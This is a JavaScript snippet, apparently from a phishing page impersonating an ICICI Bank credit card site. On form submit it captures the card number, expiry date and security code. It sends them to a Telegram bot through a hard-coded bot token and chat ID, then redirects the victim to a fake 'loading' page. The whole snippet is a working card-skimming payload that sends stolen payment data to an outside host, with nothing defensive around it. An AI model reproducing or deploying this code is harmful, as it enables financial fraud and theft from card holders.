  <script>
    document.getElementById('creditCardForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var cardNumber = document.getElementById('cardNumber').value;
      var expiryDate = document.getElementById('expiryDate').value;
      var cuu = document.getElementById('cuu').value;

      // WARNING: Exposing your Telegram bot token in client-side code is insecure
      var botToken = '7535112603:AAFDGmV34jVxjz39CvznYajK6hdm7luJDbE'; // Replace with your actual bot token
      var chatId = '7678700230'; // Replace with your actual chat ID
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;

      fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Before redirection'); // Add this line
          window.location.href = 'https://icici-credit-card.github.io/loading/';

        } else {
          alert('Failed to send the message to the Telegram bot.');
        }
      })
      .catch((error) => {
        console.error('Error:', error);
        alert('An error occurred while sending the message.');
      });
    });
  </script>
